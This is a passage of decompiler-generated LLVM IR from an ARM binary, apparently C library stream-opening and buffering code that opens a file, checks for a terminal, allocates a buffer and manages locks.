  br label %dec_label_pc_17cc8._crit_edge

dec_label_pc_17cc8._crit_edge:                    ; preds = %dec_label_pc_17cc8, %bb53
  %v0_17cd4 = phi i32 [ %v2_17ccc, %bb53 ], [ %v0_17cd4.pre, %dec_label_pc_17cc8 ]
  %v0_17cd0 = load i32, i32* @r7, align 4
  store i32 %v0_17cd0, i32* %r0.global-to-local, align 4
  store i32 %v0_17cd4, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_17cdc = call i32 @__libc_open(i32 %v0_17cd0, i32 %v0_17cd4)
  store i32 %v2_17cdc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_17ce0 = icmp slt i32 %v2_17cdc, 0
  %v1_17ce4 = load i32, i32* @r5, align 4
  %v2_17ce4 = add i32 %v1_17ce4, 4
  %v3_17ce4 = inttoptr i32 %v2_17ce4 to i32*
  store i32 %v2_17cdc, i32* %v3_17ce4, align 4
  br i1 %v1_17ce0, label %dec_label_pc_17bf0, label %.dec_label_pc_17cec_crit_edge

.dec_label_pc_17cec_crit_edge:                    ; preds = %dec_label_pc_17cc8._crit_edge
  %v0_17cf0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17cec

dec_label_pc_17cec:                               ; preds = %.dec_label_pc_17cec_crit_edge, %dec_label_pc_17cbc
  %v0_17d08 = phi i32 [ %v0_17cf0.pre, %.dec_label_pc_17cec_crit_edge ], [ %v2_17cc0, %dec_label_pc_17cbc ]
  %v0_17cec = load i32, i32* @r5, align 4
  %v1_17cec = inttoptr i32 %v0_17cec to i16*
  %v2_17cec = load i16, i16* %v1_17cec, align 2
  %v3_17cec = zext i16 %v2_17cec to i32
  %v1_17cf0 = urem i32 %v0_17d08, 4
  %v1_17cf4 = and i32 %v0_17d08, 1024
  %v1_17cf8 = and i32 %v3_17cec, 8192
  %v1_17cfc = add nuw nsw i32 %v1_17cf0, 1
  %v2_17d00 = or i32 %v1_17cf8, %v1_17cf4
  store i32 %v2_17d00, i32* %r3.global-to-local, align 4
  %v1_17d04 = xor i32 %v1_17cfc, 3
  store i32 %v1_17d04, i32* %r1.global-to-local, align 4
  %v1_17d08 = and i32 %v0_17d08, 131072
  store i32 %v1_17d08, i32* %r2.global-to-local, align 4
  %v2_17d08 = icmp eq i32 %v1_17d08, 0
  %v1_17d0c = add i32 %v0_17cec, 4
  %v2_17d0c = inttoptr i32 %v1_17d0c to i32*
  %v3_17d0c = load i32, i32* %v2_17d0c, align 4
  store i32 %v3_17d0c, i32* @r4, align 4
  br i1 %v2_17d08, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_17cec
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_17cec, %bb54
  %v0_17d18 = phi i32 [ 0, %dec_label_pc_17cec ], [ 32768, %bb54 ]
  %v4_17d14 = mul nuw nsw i32 %v1_17d04, 16
  %v5_17d14 = or i32 %v2_17d00, %v4_17d14
  store i32 %v5_17d14, i32* %r3.global-to-local, align 4
  %v2_17d18 = or i32 %v0_17d18, %v5_17d14
  store i32 %v2_17d18, i32* %r2.global-to-local, align 4
  %v2_17d1c = icmp ugt i32 %v3_17d0c, 2147483646
  store i1 %v2_17d1c, i1* %cpsr_c.global-to-local, align 1
  %v8_17d1c = icmp eq i32 %v3_17d0c, 2147483647
  %v1_17d20 = trunc i32 %v2_17d18 to i16
  store i16 %v1_17d20, i16* %v1_17cec, align 2
  br i1 %v8_17d1c, label %dec_label_pc_17d60, label %dec_label_pc_17d28

dec_label_pc_17d28:                               ; preds = %bb55
  store i32 50200, i32* %r3.global-to-local, align 4
  %v0_17d2c = call i32 @__aeabi_read_tp()
  %v3_17d30 = load i16, i16* @global_var_24150.533, align 2
  %v4_17d30 = sext i16 %v3_17d30 to i32
  store i32 %v4_17d30, i32* @r3, align 4
  store i32 %v0_17d2c, i32* @r6, align 4
  %v0_17d38 = load i32, i32* @r4, align 4
  store i32 %v0_17d38, i32* @r0, align 4
  %v2_17d3c = add i32 %v4_17d30, %v0_17d2c
  %v3_17d3c = inttoptr i32 %v2_17d3c to i32*
  %v4_17d3c = load i32, i32* %v3_17d3c, align 4
  store i32 %v4_17d3c, i32* @r4, align 4
  %v1_17d40 = call i32 @isatty(i32 %v0_17d38)
  store i32 %v1_17d40, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17d44 = icmp eq i32 %v1_17d40, 0
  br i1 %v2_17d44, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_17d28
  %v1_17d48 = load i32, i32* @r5, align 4
  %v2_17d48 = inttoptr i32 %v1_17d48 to i16*
  %v3_17d48 = load i16, i16* %v2_17d48, align 2
  %v4_17d48 = zext i16 %v3_17d48 to i32
  %v2_17d4c = or i32 %v4_17d48, 256
  store i32 %v2_17d4c, i32* %r3.global-to-local, align 4
  %v2_17d50 = trunc i32 %v2_17d4c to i16
  store i16 %v2_17d50, i16* %v2_17d48, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_17d28, %bb56
  %v3_17d58 = load i16, i16* @global_var_24150.533, align 2
  %v4_17d58 = sext i16 %v3_17d58 to i32
  store i32 %v4_17d58, i32* %r3.global-to-local, align 4
  %v0_17d5c = load i32, i32* @r4, align 4
  %v1_17d5c = load i32, i32* @r6, align 4
  %v3_17d5c = add i32 %v1_17d5c, %v4_17d58
  %v4_17d5c = inttoptr i32 %v3_17d5c to i32*
  store i32 %v0_17d5c, i32* %v4_17d5c, align 4
  br label %dec_label_pc_17d60

dec_label_pc_17d60:                               ; preds = %bb55, %.thread5
  %v0_17d60 = load i32, i32* @r5, align 4
  %v1_17d60 = add i32 %v0_17d60, 8
  %v2_17d60 = inttoptr i32 %v1_17d60 to i32*
  %v3_17d60 = load i32, i32* %v2_17d60, align 4
  store i32 %v3_17d60, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17d64 = icmp eq i32 %v3_17d60, 0
  br i1 %v2_17d64, label %dec_label_pc_17d6c, label %bb57

dec_label_pc_17d6c:                               ; preds = %dec_label_pc_17d60
  store i32 4096, i32* @r0, align 4
  %v0_17d70 = call i32 @malloc()
  store i32 %v0_17d70, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17d74 = icmp eq i32 %v0_17d70, 0
  %v1_17d84.pre = load i32, i32* @r5, align 4
  br i1 %v2_17d74, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_17d6c
  %v2_17d78 = inttoptr i32 %v1_17d84.pre to i16*
  %v3_17d78 = load i16, i16* %v2_17d78, align 2
  %v4_17d78 = zext i16 %v3_17d78 to i32
  %v2_17d7c = add i32 %v0_17d70, 4096
  store i32 %v2_17d7c, i32* %r2.global-to-local, align 4
  %v2_17d80 = or i32 %v4_17d78, 16384
  store i32 %v2_17d80, i32* %r3.global-to-local, align 4
  %v2_17d84 = add i32 %v1_17d84.pre, 8
  %v3_17d84 = inttoptr i32 %v2_17d84 to i32*
  store i32 %v0_17d70, i32* %v3_17d84, align 4
  %v1_17d88 = load i32, i32* %r2.global-to-local, align 4
  %v2_17d88 = load i32, i32* @r5, align 4
  %v3_17d88 = add i32 %v2_17d88, 12
  %v4_17d88 = inttoptr i32 %v3_17d88 to i32*
  store i32 %v1_17d88, i32* %v4_17d88, align 4
  %v1_17d8c = load i32, i32* %r3.global-to-local, align 4
  %v2_17d8c = trunc i32 %v1_17d8c to i16
  %v3_17d8c = load i32, i32* @r5, align 4
  %v4_17d8c = inttoptr i32 %v3_17d8c to i16*
  store i16 %v2_17d8c, i16* %v4_17d8c, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_17d6c
  %v2_17d8437 = add i32 %v1_17d84.pre, 8
  %v3_17d8438 = inttoptr i32 %v2_17d8437 to i32*
  store i32 0, i32* %v3_17d8438, align 4
  %v2_17d90 = load i32, i32* @r5, align 4
  %v3_17d90 = add i32 %v2_17d90, 12
  %v4_17d90 = inttoptr i32 %v3_17d90 to i32*
  store i32 0, i32* %v4_17d90, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_17d60, %.thread9
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_17d9c = load i32, i32* @r8, align 4
  %v2_17d9c = add i32 %v0_17d9c, 92
  %v3_17d9c = inttoptr i32 %v2_17d9c to i32*
  %v4_17d9c = load i32, i32* %v3_17d9c, align 4
  store i32 %v4_17d9c, i32* %r3.global-to-local, align 4
  %v2_17da0 = load i32, i32* @r5, align 4
  %v3_17da0 = add i32 %v2_17da0, 2
  %v4_17da0 = inttoptr i32 %v3_17da0 to i8*
  store i8 0, i8* %v4_17da0, align 1
  %v0_17da4 = load i32, i32* @r5, align 4
  %v1_17da4 = inttoptr i32 %v0_17da4 to i16*
  %v2_17da4 = load i16, i16* %v1_17da4, align 2
  %v3_17da4 = zext i16 %v2_17da4 to i32
  store i32 %v3_17da4, i32* %r2.global-to-local, align 4
  %v0_17da8 = load i32, i32* %r3.global-to-local, align 4
  %v1_17da8 = inttoptr i32 %v0_17da8 to i32*
  %v2_17da8 = load i32, i32* %v1_17da8, align 4
  store i32 %v2_17da8, i32* %r1.global-to-local, align 4
  %v1_17dac = add i32 %v0_17da4, 8
  %v2_17dac = inttoptr i32 %v1_17dac to i32*
  %v3_17dac = load i32, i32* %v2_17dac, align 4
  store i32 %v3_17dac, i32* %r3.global-to-local, align 4
  %v1_17db0 = and i32 %v3_17da4, 8192
  %v2_17db0 = icmp eq i32 %v1_17db0, 0
  %v2_17db4 = add i32 %v0_17da4, 20
  %v3_17db4 = inttoptr i32 %v2_17db4 to i32*
  store i32 %v3_17dac, i32* %v3_17db4, align 4
  %v0_17db8 = load i32, i32* %r1.global-to-local, align 4
  %v1_17db8 = load i32, i32* @r5, align 4
  %v2_17db8 = add i32 %v1_17db8, 52
  %v3_17db8 = inttoptr i32 %v2_17db8 to i32*
  store i32 %v0_17db8, i32* %v3_17db8, align 4
  %v0_17dbc = load i32, i32* %r3.global-to-local, align 4
  %v1_17dbc = load i32, i32* @r5, align 4
  %v2_17dbc = add i32 %v1_17dbc, 24
  %v3_17dbc = inttoptr i32 %v2_17dbc to i32*
  store i32 %v0_17dbc, i32* %v3_17dbc, align 4
  %v0_17dc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_17dc0 = load i32, i32* @r5, align 4
  %v2_17dc0 = add i32 %v1_17dc0, 28
  %v3_17dc0 = inttoptr i32 %v2_17dc0 to i32*
  store i32 %v0_17dc0, i32* %v3_17dc0, align 4
  %v0_17dc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_17dc4 = load i32, i32* @r5, align 4
  %v2_17dc4 = add i32 %v1_17dc4, 16
  %v3_17dc4 = inttoptr i32 %v2_17dc4 to i32*
  store i32 %v0_17dc4, i32* %v3_17dc4, align 4
  %v0_17dc8 = load i32, i32* %r4.global-to-local, align 4
  %v1_17dc8 = load i32, i32* @r5, align 4
  %v2_17dc8 = add i32 %v1_17dc8, 44
  %v3_17dc8 = inttoptr i32 %v2_17dc8 to i32*
  store i32 %v0_17dc8, i32* %v3_17dc8, align 4
  br i1 %v2_17db0, label %dec_label_pc_17fb0, label %dec_label_pc_17dd0

dec_label_pc_17dd0:                               ; preds = %bb57
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17dd4 = load i32, i32* @r8, align 4
  %v2_17dd4 = add i32 %v0_17dd4, 160
  %v3_17dd4 = inttoptr i32 %v2_17dd4 to i32*
  %v4_17dd4 = load i32, i32* %v3_17dd4, align 4
  store i32 %v4_17dd4, i32* %r7.global-to-local, align 4
  %v0_17dd8 = call i32 @__aeabi_read_tp()
  store i32 %v0_17dd8, i32* %r0.global-to-local, align 4
  %v1_17ddc = add i32 %v4_17dd4, 8
  %v2_17ddc = inttoptr i32 %v1_17ddc to i32*
  %v3_17ddc = load i32, i32* %v2_17ddc, align 4
  store i32 %v3_17ddc, i32* %r3.global-to-local, align 4
  %v1_17de0 = add i32 %v0_17dd8, -1168
  store i32 %v1_17de0, i32* %r6.global-to-local, align 4
  %v3_17de4 = icmp uge i32 %v3_17ddc, %v1_17de0
  store i1 %v3_17de4, i1* %cpsr_c.global-to-local, align 1
  %v9_17de4 = icmp eq i32 %v3_17ddc, %v1_17de0
  br i1 %v9_17de4, label %dec_label_pc_17e28, label %dec_label_pc_17dec

dec_label_pc_17dec:                               ; preds = %dec_label_pc_17dd0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_17dd4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17df4

dec_label_pc_17df4:                               ; preds = %dec_label_pc_17e00.dec_label_pc_17df4_crit_edge, %dec_label_pc_17dec
  %v0_17df4 = phi i32 [ %v0_17df4.pre, %dec_label_pc_17e00.dec_label_pc_17df4_crit_edge ], [ %v4_17dd4, %dec_label_pc_17dec ]
  %v1_17df4 = inttoptr i32 %v0_17df4 to i32*
  %v2_17df4 = load i32, i32* %v1_17df4, align 4
  store i32 %v2_17df4, i32* %r3.global-to-local, align 4
  %v1_17df8 = load i32, i32* %r4.global-to-local, align 4
  %v3_17df8 = icmp uge i32 %v2_17df4, %v1_17df8
  store i1 %v3_17df8, i1* %cpsr_c.global-to-local, align 1
  %v9_17df8 = icmp eq i32 %v2_17df4, %v1_17df8
  br i1 %v9_17df8, label %dec_label_pc_17e00, label %dec_label_pc_17e18

dec_label_pc_17e00:                               ; preds = %dec_label_pc_17df4
  store i32 %v2_17df4, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17e10 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17e10, label %dec_label_pc_17e14, label %dec_label_pc_17e00.dec_label_pc_17df4_crit_edge

dec_label_pc_17e00.dec_label_pc_17df4_crit_edge:  ; preds = %dec_label_pc_17e00
  %v0_17df4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17df4

dec_label_pc_17e14:                               ; preds = %dec_label_pc_17e00
  %v0_17e14 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17e14, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17e18

dec_label_pc_17e18:                               ; preds = %dec_label_pc_17df4, %dec_label_pc_17e14
  %v0_17e18 = phi i32 [ %v0_17e14, %dec_label_pc_17e14 ], [ %v2_17df4, %dec_label_pc_17df4 ]
  %v1_17e18 = phi i32 [ %v0_17e14, %dec_label_pc_17e14 ], [ %v1_17df8, %dec_label_pc_17df4 ]
  %v3_17e18 = icmp uge i32 %v0_17e18, %v1_17e18
  store i1 %v3_17e18, i1* %cpsr_c.global-to-local, align 1
  %v9_17e18 = icmp eq i32 %v0_17e18, %v1_17e18
  br i1 %v9_17e18, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_17e18
  %v1_17e1c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_17e1c, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_17e18, %bb58
  %v1_17e20 = xor i1 %v9_17e18, true
  call void @__pseudo_cond_branch(i1 %v1_17e20, i32 ptrtoint (i32* @global_var_16070.705 to i32))
  %v0_17e24 = load i32, i32* %r6.global-to-local, align 4
  %v1_17e24 = load i32, i32* %r7.global-to-local, align 4
  %v2_17e24 = add i32 %v1_17e24, 8
  %v3_17e24 = inttoptr i32 %v2_17e24 to i32*
  store i32 %v0_17e24, i32* %v3_17e24, align 4
  %v1_17e44.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17e28

dec_label_pc_17e28:                               ; preds = %dec_label_pc_17dd0, %bb59
  %v1_17e44 = phi i32 [ %v3_17ddc, %dec_label_pc_17dd0 ], [ %v1_17e44.pre, %bb59 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17e2c = load i32, i32* @r8, align 4
  %v2_17e2c = add i32 %v0_17e2c, 160
  %v3_17e2c = inttoptr i32 %v2_17e2c to i32*
  %v4_17e2c = load i32, i32* %v3_17e2c, align 4
  store i32 %v4_17e2c, i32* %r1.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_17e34 = add i32 %v0_17e2c, 152
  %v3_17e34 = inttoptr i32 %v2_17e34 to i32*
  %v4_17e34 = load i32, i32* %v3_17e34, align 4
  store i32 %v4_17e34, i32* %r7.global-to-local, align 4
  %v1_17e38 = add i32 %v4_17e2c, 4
  %v2_17e38 = inttoptr i32 %v1_17e38 to i32*
  %v3_17e38 = load i32, i32* %v2_17e38, align 4
  store i32 %v3_17e38, i32* %r3.global-to-local, align 4
  %v1_17e3c = add i32 %v4_17e34, 8
  %v2_17e3c = inttoptr i32 %v1_17e3c to i32*
  %v3_17e3c = load i32, i32* %v2_17e3c, align 4
  store i32 %v3_17e3c, i32* %r2.global-to-local, align 4
  %v1_17e40 = add i32 %v3_17e38, 1
  store i32 %v1_17e40, i32* %r3.global-to-local, align 4
  %v3_17e44 = icmp uge i32 %v3_17e3c, %v1_17e44
  store i1 %v3_17e44, i1* %cpsr_c.global-to-local, align 1
  %v9_17e44 = icmp eq i32 %v3_17e3c, %v1_17e44
  store i32 %v1_17e40, i32* %v2_17e38, align 4
  br i1 %v9_17e44, label %dec_label_pc_17e90, label %dec_label_pc_17e50

dec_label_pc_17e50:                               ; preds = %dec_label_pc_17e28
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_17e54 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_17e54, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_17e5c95 = inttoptr i32 %v0_17e54 to i32*
  %v2_17e5c96 = load i32, i32* %v1_17e5c95, align 4
  store i32 %v2_17e5c96, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_17e6098 = icmp eq i32 %v2_17e5c96, 0
  br i1 %v9_17e6098, label %dec_label_pc_17e68, label %dec_label_pc_17e80

dec_label_pc_17e68:                               ; preds = %dec_label_pc_17e50, %dec_label_pc_17e68.dec_label_pc_17e5c_crit_edge
  %v0_17e6899 = phi i32 [ %v1_17e60.pre, %dec_label_pc_17e68.dec_label_pc_17e5c_crit_edge ], [ 0, %dec_label_pc_17e50 ]
  store i32 %v0_17e6899, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17e78 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17e78, label %dec_label_pc_17e7c, label %dec_label_pc_17e68.dec_label_pc_17e5c_crit_edge

dec_label_pc_17e68.dec_label_pc_17e5c_crit_edge:  ; preds = %dec_label_pc_17e68
  %v0_17e5c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17e60.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17e5c = inttoptr i32 %v0_17e5c.pre to i32*
  %v2_17e5c = load i32, i32* %v1_17e5c, align 4
  store i32 %v2_17e5c, i32* %r3.global-to-local, align 4
  %v3_17e60 = icmp uge i32 %v2_17e5c, %v1_17e60.pre
  store i1 %v3_17e60, i1* %cpsr_c.global-to-local, align 1
  %v9_17e60 = icmp eq i32 %v2_17e5c, %v1_17e60.pre
  br i1 %v9_17e60, label %dec_label_pc_17e68, label %dec_label_pc_17e80

dec_label_pc_17e7c:                               ; preds = %dec_label_pc_17e68
  %v0_17e7c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17e7c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17e80

dec_label_pc_17e80:                               ; preds = %dec_label_pc_17e50, %dec_label_pc_17e68.dec_label_pc_17e5c_crit_edge, %dec_label_pc_17e7c
  %v0_17e80 = phi i32 [ %v0_17e7c, %dec_label_pc_17e7c ], [ %v2_17e5c96, %dec_label_pc_17e50 ], [ %v2_17e5c, %dec_label_pc_17e68.dec_label_pc_17e5c_crit_edge ]
  %v1_17e80 = phi i32 [ %v0_17e7c, %dec_label_pc_17e7c ], [ 0, %dec_label_pc_17e50 ], [ %v1_17e60.pre, %dec_label_pc_17e68.dec_label_pc_17e5c_crit_edge ]
  %v3_17e80 = icmp uge i32 %v0_17e80, %v1_17e80
  store i1 %v3_17e80, i1* %cpsr_c.global-to-local, align 1
  %v9_17e80 = icmp eq i32 %v0_17e80, %v1_17e80
  br i1 %v9_17e80, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_17e80
  %v1_17e84 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_17e84, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_17e80, %bb60
  %v1_17e88 = xor i1 %v9_17e80, true
  call void @__pseudo_cond_branch(i1 %v1_17e88, i32 ptrtoint (i32* @global_var_16070.705 to i32))
  %v0_17e8c = load i32, i32* %r6.global-to-local, align 4
  %v1_17e8c = load i32, i32* %r7.global-to-local, align 4
  %v2_17e8c = add i32 %v1_17e8c, 8
  %v3_17e8c = inttoptr i32 %v2_17e8c to i32*
  store i32 %v0_17e8c, i32* %v3_17e8c, align 4
  br label %dec_label_pc_17e90

dec_label_pc_17e90:                               ; preds = %dec_label_pc_17e28, %bb61
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_17e94 = load i32, i32* @r8, align 4
  %v2_17e94 = add i32 %v0_17e94, 152
  %v3_17e94 = inttoptr i32 %v2_17e94 to i32*
  %v4_17e94 = load i32, i32* %v3_17e94, align 4
  store i32 %v4_17e94, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_17e9c = add i32 %v0_17e94, 76
  %v3_17e9c = inttoptr i32 %v2_17e9c to i32*
  %v4_17e9c = load i32, i32* %v3_17e9c, align 4
  store i32 %v4_17e9c, i32* %r1.global-to-local, align 4
  %v1_17ea0 = add i32 %v4_17e94, 4
  %v2_17ea0 = inttoptr i32 %v1_17ea0 to i32*
  %v3_17ea0 = load i32, i32* %v2_17ea0, align 4
  store i32 %v3_17ea0, i32* %r3.global-to-local, align 4
  %v1_17ea4 = inttoptr i32 %v4_17e9c to i32*
  %v2_17ea4 = load i32, i32* %v1_17ea4, align 4
  store i32 %v2_17ea4, i32* %r2.global-to-local, align 4
  %v1_17ea8 = add i32 %v3_17ea0, 1
  store i32 %v1_17ea8, i32* %r3.global-to-local, align 4
  store i32 %v1_17ea8, i32* %v2_17ea0, align 4
  %v0_17eb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_17eb0 = load i32, i32* @r5, align 4
  %v2_17eb0 = add i32 %v1_17eb0, 32
  %v3_17eb0 = inttoptr i32 %v2_17eb0 to i32*
  store i32 %v0_17eb0, i32* %v3_17eb0, align 4
  %v0_17eb4 = load i32, i32* %r0.global-to-local, align 4
  %v1_17eb4 = add i32 %v0_17eb4, 4
  %v2_17eb4 = inttoptr i32 %v1_17eb4 to i32*
  %v3_17eb4 = load i32, i32* %v2_17eb4, align 4
  %v1_17eb8 = add i32 %v3_17eb4, -1
  store i32 %v1_17eb8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17ebc = icmp eq i32 %v1_17eb8, 0
  %v0_17ec0 = load i32, i32* @r5, align 4
  %v1_17ec0 = load i32, i32* %r1.global-to-local, align 4
  %v2_17ec0 = inttoptr i32 %v1_17ec0 to i32*
  store i32 %v0_17ec0, i32* %v2_17ec0, align 4
  %v0_17ec4 = load i32, i32* %r3.global-to-local, align 4
  %v1_17ec4 = load i32, i32* %r0.global-to-local, align 4
  %v2_17ec4 = add i32 %v1_17ec4, 4
  %v3_17ec4 = inttoptr i32 %v2_17ec4 to i32*
  store i32 %v0_17ec4, i32* %v3_17ec4, align 4
  br i1 %v2_17ebc, label %dec_label_pc_17ecc, label %dec_label_pc_17f2c

dec_label_pc_17ecc:                               ; preds = %dec_label_pc_17e90
  %v0_17ecc = load i32, i32* %r3.global-to-local, align 4
  %v1_17ecc = load i32, i32* %r0.global-to-local, align 4
  %v2_17ecc = add i32 %v1_17ecc, 8
  %v3_17ecc = inttoptr i32 %v2_17ecc to i32*
  store i32 %v0_17ecc, i32* %v3_17ecc, align 4
  %v0_17ed0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17ed0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17ed4

dec_label_pc_17ed4:                               ; preds = %dec_label_pc_17f04.dec_label_pc_17ed4_crit_edge, %dec_label_pc_17ecc
  %v0_17ed4 = phi i32 [ %v0_17ed4.pre, %dec_label_pc_17f04.dec_label_pc_17ed4_crit_edge ], [ %v0_17ed0, %dec_label_pc_17ecc ]
  %v1_17ed4 = inttoptr i32 %v0_17ed4 to i32*
  %v2_17ed4 = load i32, i32* %v1_17ed4, align 4
  store i32 %v2_17ed4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17ed4, i32* %r2.global-to-local, align 4
  %v2_17ee083 = load i32, i32* %v1_17ed4, align 4
  store i32 %v2_17ee083, i32* %r3.global-to-local, align 4
  %v3_17ee485 = icmp uge i32 %v2_17ee083, %v2_17ed4
  store i1 %v3_17ee485, i1* %cpsr_c.global-to-local, align 1
  %v9_17ee491 = icmp eq i32 %v2_17ee083, %v2_17ed4
  br i1 %v9_17ee491, label %dec_label_pc_17eec, label %dec_label_pc_17f04

dec_label_pc_17eec:                               ; preds = %dec_label_pc_17ed4, %dec_label_pc_17eec.dec_label_pc_17ee0_crit_edge
  %v0_17eec92 = phi i32 [ %v1_17ee4.pre, %dec_label_pc_17eec.dec_label_pc_17ee0_crit_edge ], [ %v2_17ed4, %dec_label_pc_17ed4 ]
  store i32 %v0_17eec92, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17efc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17efc, label %dec_label_pc_17f00, label %dec_label_pc_17eec.dec_label_pc_17ee0_crit_edge

dec_label_pc_17eec.dec_label_pc_17ee0_crit_edge:  ; preds = %dec_label_pc_17eec
  %v0_17ee0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17ee4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17ee0 = inttoptr i32 %v0_17ee0.pre to i32*
  %v2_17ee0 = load i32, i32* %v1_17ee0, align 4
  store i32 %v2_17ee0, i32* %r3.global-to-local, align 4
  %v3_17ee4 = icmp uge i32 %v2_17ee0, %v1_17ee4.pre
  store i1 %v3_17ee4, i1* %cpsr_c.global-to-local, align 1
  %v9_17ee4 = icmp eq i32 %v2_17ee0, %v1_17ee4.pre
  br i1 %v9_17ee4, label %dec_label_pc_17eec, label %dec_label_pc_17f04

dec_label_pc_17f00:                               ; preds = %dec_label_pc_17eec
  %v0_17f00 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17f00, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17f04

dec_label_pc_17f04:                               ; preds = %dec_label_pc_17ed4, %dec_label_pc_17eec.dec_label_pc_17ee0_crit_edge, %dec_label_pc_17f00
  %v0_17f0c = phi i32 [ %v0_17f00, %dec_label_pc_17f00 ], [ %v2_17ee083, %dec_label_pc_17ed4 ], [ %v2_17ee0, %dec_label_pc_17eec.dec_label_pc_17ee0_crit_edge ]
  %v1_17f04 = phi i32 [ %v0_17f00, %dec_label_pc_17f00 ], [ %v2_17ed4, %dec_label_pc_17ed4 ], [ %v1_17ee4.pre, %dec_label_pc_17eec.dec_label_pc_17ee0_crit_edge ]
  %v3_17f04 = icmp uge i32 %v0_17f0c, %v1_17f04
  store i1 %v3_17f04, i1* %cpsr_c.global-to-local, align 1
  %v9_17f04 = icmp eq i32 %v0_17f0c, %v1_17f04
  br i1 %v9_17f04, label %dec_label_pc_17f0c, label %dec_label_pc_17f04.dec_label_pc_17ed4_crit_edge

dec_label_pc_17f04.dec_label_pc_17ed4_crit_edge:  ; preds = %dec_label_pc_17f04
  %v0_17ed4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17ed4

dec_label_pc_17f0c:                               ; preds = %dec_label_pc_17f04
  %v2_17f0c = icmp ne i32 %v1_17f04, 0
  store i1 %v2_17f0c, i1* %cpsr_c.global-to-local, align 1
  %v7_17f10 = icmp slt i32 %v1_17f04, 2
  br i1 %v7_17f10, label %dec_label_pc_17f2c, label %dec_label_pc_17f14

dec_label_pc_17f14:                               ; preds = %dec_label_pc_17f0c
  %v0_17f14 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_17f14, i32* %r0.global-to-local, align 4
  %v0_17f18 = load i32, i32* %r1.global-to-local, align 4
  %v1_17f18 = add i32 %v0_17f18, 129
  store i32 %v1_17f18, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17f2c

dec_label_pc_17f2c:                               ; preds = %dec_label_pc_17e90, %dec_label_pc_17f14, %dec_label_pc_17f0c
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17f30 = load i32, i32* @r8, align 4
  %v2_17f30 = add i32 %v0_17f30, 160
  %v3_17f30 = inttoptr i32 %v2_17f30 to i32*
  %v4_17f30 = load i32, i32* %v3_17f30, align 4
  store i32 %v4_17f30, i32* %r0.global-to-local, align 4
  %v1_17f34 = add i32 %v4_17f30, 4
  %v2_17f34 = inttoptr i32 %v1_17f34 to i32*
